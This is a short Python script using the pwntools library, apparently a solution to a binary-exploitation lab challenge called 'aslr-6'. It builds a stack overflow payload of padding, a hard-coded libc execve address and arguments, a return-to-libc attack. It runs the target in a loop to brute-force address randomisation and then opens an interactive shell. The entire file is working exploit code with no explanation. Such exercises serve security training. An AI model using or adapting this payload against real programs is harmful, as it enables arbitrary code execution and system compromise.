#!/usr/bin/env python

from pwn import *
import os


execve = p32(0xb7e4e7e0)
addr = p32(0xb7e4f388)

buf = "A" * 0x8c + execve + "BBBB"  + addr + p32(0) + p32(0)

while True:
    p = process('./aslr-6')

    p.sendline(buf)
    p.interactive()
    p.close()
